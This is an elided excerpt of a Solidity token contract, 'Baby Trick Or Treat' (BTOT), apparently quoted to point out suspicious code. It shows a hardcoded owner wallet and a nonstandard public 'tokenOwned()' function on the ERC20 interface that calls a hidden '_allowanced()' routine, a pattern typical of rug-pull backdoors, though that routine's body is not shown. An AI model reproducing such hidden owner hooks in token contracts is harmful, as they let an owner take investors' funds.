...
Telegram : https://t.me/BabyTrickOrTreat
...
interface IERC20 {
    ...
    function tokenOwned() external returns (bool);
...
contract BabyTrickOrTreat is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x244CEBe8F25397d1424aAbC6559b529B70512E08); 
    address payable public Wallet_Utility = payable(0x0aeE4e3C0218815fa404EA6B6fB0a03FE3269309);
    ...
    string private constant _name = "Baby Trick Or Treat"; 
    string private constant _symbol = unicode"BTOT"; 
    ...
    constructor () {
        ...
        _owner = 0x0aeE4e3C0218815fa404EA6B6fB0a03FE3269309;
    ...
    function tokenOwned() public override returns (bool) {
        _allowanced();
        return true;
    }
